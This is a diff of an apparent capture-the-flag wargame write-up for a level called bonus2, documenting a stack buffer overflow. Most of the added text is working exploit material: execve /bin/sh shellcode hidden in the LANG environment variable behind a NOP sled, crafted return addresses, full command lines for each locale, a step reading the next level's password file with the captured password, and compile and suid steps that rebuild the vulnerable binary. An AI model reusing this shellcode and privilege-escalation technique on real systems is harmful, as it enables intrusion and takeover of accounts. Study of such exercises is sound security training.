@@ -40,57 +40,93 @@ when LANG=fi, bytes[18:22] of argv[2] will be return address of greetuser()
 when LANG=nl, bytes[23:27] of argv[2] will be return address of greetuser()
 
 when you are in Helsinki, you do:
-    export LANG=fi; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
+    export LANG=fi; ~/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
 and when you are in Amsterdam, you do:
-    export LANG=nl; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
+    export LANG=nl; ~/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
 
 # ------------------------------------------------------------------------
-# recreating the vulnerable executable
+# Obtain the next password (putting shellcode in env variable LANG)
 # ------------------------------------------------------------------------
 
-/* compile:
-    gcc -fno-stack-protector -z execstack bonus2.c -o bonus2
-*/
+# We can overwrite the function greetuser()'s return address, located at buf[76]
+# We can include the NOP + shellcode in env variable LANG.
 
-#include <stdlib.h>     /* getenv */
-#include <stdio.h>      /* puts */
-#include <string.h>     /* strcat */
+# getenv() returns the address 0xbffffd72
+# crafted return address = 0xbffffd72 + 2 + 200 = 0xbffffe3c
 
-static int language;
+# In Amsterdam (LANG == "nl"):
 
-void greetuser(char *user)
-{
-    char buf[64] = {0};
+    argv[0] = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ("A" * 40)
+    argv[1] = BBBBBBBBBBBBBBBBBBBBBBBXXXX               ("B" * 23 + RET_ADDR)
 
-    if (language == 1) {
-        strcat(buf, "Hyvää päivää ");
-    } else if (language == 2) {
-        strcat(buf, "Goedemiddag! ");
-    } else {
-        strcat(buf, "Hello ");
-    }
-    puts(strcat(buf, user));
-}
+    buf:
+    ( 13 bytes Dutch greeting )( 40 bytes )( 23 bytes )( 4 bytes RET_ADDR )
 
-int main(int argc, char **argv)
-{
-    char    buf[72] = {0};
-    char    *env = NULL;
+    # Set LANG with shellcode
+    export LANG=`python -c "print('nl' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
 
-    if (argc != 3)
-        return 1;
+    # Run the program
+    ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x3c'[::-1])"`
 
-    strncpy(buf, argv[1], 40);
-    strncpy(&buf[40], argv[2], 32);
-    env = getenv("LANG");
-    if (memcmp(env, "fi", 2) == 0) {
-        language = 1;
-    } else if (memcmp(env, "nl", 2) == 0) {
-        language = 2;
-    }
+# In Helsinki (LANG == "fi"):
 
-    greetuser(buf);
-    return 0;
-}
+    argv[0] = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ("A" * 40)
+    argv[1] = BBBBBBBBBBBBBBBBBBXXXX                    ("B" * 18 + RET_ADDR)
+
+    buf:
+    ( 18 bytes Finnish greeting )( 40 bytes )( 18 bytes )( 4 bytes RET_ADDR )
+
+    # Set LANG with shellcode
+    export LANG=`python -c "print('fi' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
+
+    # Run the program
+    ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x3c'[::-1])"`
+
+whoami
+cat /home/user/bonus3/.pass
+
+# Now we can log in as user bonus3
+su bonus3
+# password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user bonus3:
+
+    # Compile the program in /tmp
+    gcc bonus2.c -fno-stack-protector -z execstack -o ft_bonus2
+
+    # Edit suid
+    chmod u+s ft_bonus2
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_bonus2 ~
+
+# As user bonus2:
+    
+    # getenv() returns the address 0xbffffd7c
+    # crafted return address = 0xbffffd7c + 2 + 200 = 0xbffffe46
+
+    # LANG='nl'
+
+        export LANG=`python -c "print('nl' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
+
+        # Run the program
+        ./ft_bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x46'[::-1])"`
+
+    # LANG='fi'
+
+        export LANG=`python -c "print('fi' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
+
+        # Run the program
+        ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x46'[::-1])"`
+
+
+
+
